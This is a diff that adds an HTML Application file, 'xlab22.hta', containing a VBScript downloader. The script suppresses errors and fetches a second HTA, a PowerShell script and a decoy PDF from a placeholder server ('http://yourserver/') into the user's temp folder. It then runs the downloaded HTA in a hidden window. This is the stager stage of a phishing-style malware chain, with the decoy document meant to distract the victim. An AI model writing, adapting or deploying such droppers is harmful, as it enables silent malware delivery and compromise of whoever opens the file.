@@ -1,0 +1,56 @@
+<!-- xlab22.hta -->
+<html>
+<head>
+<hta:application id="oHTA" border="thin" caption="yes" sysmenu="yes" showintaskbar="yes"/>
+<script language="VBScript">
+On Error Resume Next
+Set objShell = CreateObject("WScript.Shell")
+strTempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
+strHTAPath = strTempPath & "\311.hta"
+strPSPath = strTempPath & "\powershellscript.ps1"
+strPDFPath = strTempPath & "\decoypdf.pdf"
+
+' Function to download a file
+Function DownloadFile(url, filePath)
+    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+    objXMLHTTP.Open "GET", url, False
+    objXMLHTTP.send()
+    If objXMLHTTP.Status = 200 Then
+        Set objADOStream = CreateObject("ADODB.Stream")
+        objADOStream.Type = 1 'Binary
+        objADOStream.Open
+        objADOStream.Write objXMLHTTP.responseBody
+        objADOStream.Position = 0
+        objADOStream.SaveToFile filePath, 2 'Overwrite
+        objADOStream.Close
+        DownloadFile = True
+    Else
+        DownloadFile = False
+    End If
+End Function
+
+' Download 311.hta
+If Not DownloadFile("http://yourserver/311.hta", strHTAPath) Then
+    MsgBox "Failed to download 311.hta"
+    WScript.Quit
+End If
+
+' Download powershellscript.ps1
+If Not DownloadFile("http://yourserver/powershellscript.ps1", strPSPath) Then
+    MsgBox "Failed to download powershellscript.ps1"
+    WScript.Quit
+End If
+
+' Download decoypdf.pdf
+If Not DownloadFile("http://yourserver/decoypdf.pdf", strPDFPath) Then
+    MsgBox "Failed to download decoypdf.pdf"
+    WScript.Quit
+End If
+
+' Run 311.hta
+objShell.Run strHTAPath, 0, True
+</script>
+</head>
+<body>
+</body>
+</html>
